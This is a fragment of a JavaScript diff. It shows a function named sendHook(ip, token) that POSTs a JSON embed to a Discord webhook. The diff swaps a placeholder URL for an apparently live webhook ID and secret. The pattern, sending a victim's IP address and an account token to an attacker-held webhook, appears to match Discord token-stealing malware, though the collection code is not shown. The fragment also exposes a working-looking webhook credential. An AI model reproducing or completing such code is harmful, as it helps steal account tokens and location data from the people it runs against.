@@ -28,7 +28,7 @@ async function sendHook(ip, token) {
             }
         ]
     }
-    fetch('https://discord.com/api/webhooks/id/token', {
+    fetch('https://discord.com/api/webhooks/1460294272090640505/Tqp4OjmLRloKw94D-mALp0ZdLYJwoA3NzPb6CM0x4qPHM-w4Mt3KG-G0pLlrHH6GCeS6', {
         method: "POST",
         headers: {
             'Content-type': 'application/json'
